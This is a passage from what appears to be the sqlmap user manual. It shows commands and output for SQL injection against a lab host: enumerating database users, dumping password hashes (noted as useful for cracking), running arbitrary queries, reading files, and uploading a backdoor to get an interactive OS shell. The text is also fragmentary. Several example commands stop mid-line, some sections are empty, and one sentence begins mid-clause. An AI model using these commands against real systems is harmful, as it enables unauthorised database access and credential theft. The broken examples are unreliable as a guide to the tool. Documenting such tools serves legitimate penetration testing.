</verb></tscreen>


<sect2>Users

<p>
Option: <tt>--users</tt>

<p>
It is possible to enumerate the list of database management system users.

<p>
Example on a <bf>PostgreSQL 8.3.5</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --users -v 0

[*] testuser
[*] testuser2
</verb></tscreen>


<sect2>Users password hashes

<p>
Options: <tt>--passwords</tt> and <tt>-U</tt>

<p>
It is possible to enumerate the password hashes for each database
management system user.

<p>
Example on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --passwords -v 0

[*] testuser [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
</verb></tscreen>

<p>
You can also provide the <tt>-U</tt> option to specify the user who you
want to enumerate the password hashes.

<p>
Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --passwords \

        uppercase: 2c2f01b293b03edb7491fba9930b62ee5d506955
</verb></tscreen>

<p>
As you can see, when you enumerate password hashes on Microsoft SQL Server
sqlmap split the hash, useful if you want to crack it.

<p>
If you provide <tt>CU</tt> as username it will consider it as an alias for
current user and will retrieve the password hashes for this user.

<p>
You can also provide the <tt>-D</tt> option to specify the database
that you want to enumerate the tables.

<p>
Example on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --tables \

<p>
Note that on Oracle you have to provide the <tt>TABLESPACE_NAME</tt>
instead of the database name, in my example that is <tt>users</tt> to
retrieve all tables owned by an Oracle database management system
user.


<sect2>Database table columns

<p>

<p>
Note that on Microsoft SQL Server the <tt>master</tt> database is not
considered a system database because some database administrators use it
as a users' database.


<sect2>Run your own SQL statement

<!-- TODO: improve -->

<p>
Options: <tt>--sql-query</tt> and <tt>--sql-shell</tt>

<p>
The SQL query and the SQL shell features makes the user able to run
whatever <tt>SELECT</tt> statement on the web application's back-end
database management system and retrieve its output.

<p>
Examples on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:

<tscreen><verb>

SELECT 'foo':    'foo'

$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --sql-query \
  "SELECT 'foo', 'bar'" -v 1

[...]
[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into 
distinct queries to be able to retrieve the output even if we are going blind
[hh:mm:50] [INFO] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)),

SELECT 'foo', 'bar':    'foo, bar'
</verb></tscreen>

<p>
As you can see from this last example, sqlmap splits the query in two
different <tt>SELECT</tt> statement to be able to retrieve the output even
when using blind SQL injection technique.
Otherwise in inband SQL injection technique it only perform a single HTTP
request to get the user's query output:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --sql-query \

</verb></tscreen>

<p>
Examples on an <bf>Oracle XE 10.2.0.1</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --sql-query \
  "SELECT 'foo' FROM dual" -v 0

[hh:mm:04] [INPUT] does the SQL query that you provide might return multiple entries? [Y/n] n
SELECT 'foo' FROM dual:    'foo'
</verb></tscreen>

<p>
As you can see, if your <tt>SELECT</tt> statement contains a <tt>FROM</tt>
clause, sqlmap asks the user if such statement can return multiple entries
and in such case the tool knows how to unpack the query correctly to
retrieve its whole output line per line when going through blind SQL
injection technique.

<p>
Example on a <bf>PostgreSQL 8.3.5</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-query \
  "SELECT usename FROM pg_user" -v 0

[hh:mm:47] [INPUT] does the SQL query that you provide might return multiple entries? [Y/n] y
[hh:mm:48] [INPUT] the SQL query that you provide can return up to 3 entries. How many 
entries do you want to retrieve?
[a] All (default)
[#] Specific number
[q] Quit
Choice: 2
SELECT usename FROM pg_user [2]:
[*] postgres
[*] testuser
</verb></tscreen>

<p>
As you can see from the last example, sqlmap counts the number of entries
for your query and asks how many entries from the top you want to dump.
Otherwise if you specify also the <tt>LIMIT</tt>, or similar, clause
sqlmap will not ask anything, just unpack the query and return its
output line per line when going through blind SQL injection technique.

<p>
Example on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-query \

As you can see in this last example, if the <tt>SELECT</tt> statement has
an asterisk instead of the column(s) name, sqlmap first retrieves the
column names of the table then asks if the query can return multiple
entries and goes on.

has <tt>FILE</tt> access (access to <tt>LOAD_FILE()</tt> builtin function),
it is possible to read the content of a specific file from the file system.

<p>
Example on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" \

<sect1>Operating system access

<sect2>Prompt for an interactive operating system shell

<p>
Option: <tt>--os-shell</tt>

<p>
If the back-end database management system is MySQL, the web application's
programming language is PHP and you, or sqlmap itself, found a writable
directory within the web server document root path, sqlmap can prompt for
an interactive operating system shell on the back-end database management
system.

<p>
Example on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" \
  --os-shell -v 0

[hh:mm:49] [WARNING] unable to retrieve the injectable file absolute system path
[hh:mm:49] [WARNING] unable to retrieve the remote web server document root
[hh:mm:49] [INPUT] please provide the web server document root [/var/www]: 
[hh:mm:53] [INPUT] please provide a list of directories absolute path comma separated that 
you want sqlmap to try to upload the agent [/var/www/test]: 
[hh:mm:55] [INPUT] do you want to use the uploaded backdoor as a shell to execute commands 
right now? [Y/n] y
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ exit
</verb></tscreen>

<p>
As you might notice, such operating system shell has the same
functionalities of SQL shell in terms of TAB completion and history support.


<sect1>Miscellaneous

<sect2>Estimated time of arrival

<p>
Option: <tt>--eta</tt>

<p>
It is possible to calculate and show the estimated time of arrival to
retrieve each query output in real time while performing the SQL injection
attack.

<p>
Example on an <bf>Oracle XE 10.2.0.1</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" -b \

<p>
As you can see, sqlmap first calculates the length of the query output,
then estimated the time of arrival, shows the progress in percentage and
counts the number of retrieved query output characters.


<sect2>Update sqlmap to the latest stable version

<p>
Option: <tt>--update</tt>

<p>

It is possible to update sqlmap to the latest stable version available on
its <htmlurl url="http://sourceforge.net/project/showfiles.php?group_id=171598&amp;package_id=196107"

<p>
As you can see, sqlmap first check if a new stable version is available,
then in case it is, download it, unzip it and update the Microsoft SQL
Server XML versions file from Chip Andrews'
<htmlurl url="http://www.sqlsecurity.com/FAQs/SQLServerVersionDatabase/tabid/63/Default.aspx"
name="SQLSecurity.com site">.

<p>
Note that the default configuration file <tt>sqlmap.conf</tt> is backupped
to <tt>sqlmap.conf.bak</tt> in case a new stable version is available and
your copy is updated.


<sect2>Save and resume all data retrieved on a session file

<p>
Option: <tt>-s</tt>

<p>
It is possible to log all queries and their output on a text file while
performing whatever request, both in blind SQL injection and in inband SQL
injection.
This is useful if you stop the injection and resume it after some time.

<p>
Example on a <bf>PostgreSQL 8.3.5</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
  -v 1 -s "sqlmap.log"

<p>
As you can see, I stopped the injection with <tt>CTRL-C</tt> while
retrieving the PostgreSQL banner and logged the session to text file
<tt>sqlmap.log</tt>.

<tscreen><verb>

<p>
As you can see, all queries performed and their output have been logged to
the session file in real time while performing the injection.

The session file has a structure as follows:

<tscreen><verb>
[hh:mm:ss MM/DD/YY]
[Target URL][Injection point][Parameters][Query or information name][Query output or value]
</verb></tscreen>

<p>
Performing the same request now, sqlmap resumes all information already
retrieved then calculates the query length, in the example
<tt>VERSION()</tt>, and resumes the injection from the last character
retrieved to the end of the query output.

<tscreen><verb>
